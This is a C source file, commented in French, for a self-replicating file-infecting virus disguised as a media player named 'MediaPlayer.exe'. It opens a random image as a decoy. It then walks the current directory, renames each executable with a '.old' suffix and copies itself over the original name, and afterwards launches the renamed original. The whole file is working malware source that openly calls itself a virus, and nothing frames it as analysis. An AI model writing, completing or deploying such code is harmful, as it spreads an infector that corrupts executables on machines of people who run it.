#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <time.h>

// Afficher une image pour simuler un lecteur multimédia
void afficher_image() {
    const char *images[] = {
        "img1.jpg", "img2.jpg", "img3.jpg",
        "img4.jpg", "img5.jpg", "img6.jpg"
    };
    srand(time(NULL));
    int index = rand() % 6;
    char commande[256];
    snprintf(commande, sizeof(commande), "xdg-open %s &", images[index]);
    system(commande);
}

// Vérifier si un fichier est déjà infecté
int est_infecte(const char *nom_fichier) {
    return strstr(nom_fichier, ".old") != NULL;
}

// Infecter un fichier exécutable
void infecter_fichier(const char *nom_fichier) {
    char nouveau_nom[256];
    snprintf(nouveau_nom, sizeof(nouveau_nom), "%s.old", nom_fichier);

    // Renommer l'original
    if (rename(nom_fichier, nouveau_nom) != 0) {
        perror("Erreur de renommage");
        return;
    }

    // Copier le virus sous le nom original
    char commande[512];
    snprintf(commande, sizeof(commande), "cp MediaPlayer.exe %s", nom_fichier);
    system(commande);
}

// Exécuter le fichier original après l'infection
void executer_original(const char *nom_original) {
    char commande[256];
    snprintf(commande, sizeof(commande), "./%s.old", nom_original);
    execl(commande, commande, NULL);
}

void chercher_executables() {
    DIR *d;
    struct dirent *dir;
    struct stat buf;

    d = opendir(".");
    if (!d) {
        perror("Erreur ouverture répertoire");
        return;
    }

    while ((dir = readdir(d)) != NULL) {
        if (stat(dir->d_name, &buf) == 0) {
            if (S_ISREG(buf.st_mode) && (buf.st_mode & S_IXUSR)) {  // Vérifier si c'est un exécutable
                
                if (strcmp(dir->d_name, "MediaPlayer.exe") == 0) {
                    continue;
                }

                if (!est_infecte(dir->d_name)) {  // Vérifier si le fichier est déjà infecté
                    infecter_fichier(dir->d_name);
                }
            }
        }
    }
    closedir(d);
}

int main(int argc, char *argv[]) {
    afficher_image();  // Simule le lecteur multimédia
    chercher_executables();  // Infecte les fichiers
    executer_original(argv[0]);  // Exécute le programme original
    return 0;
}
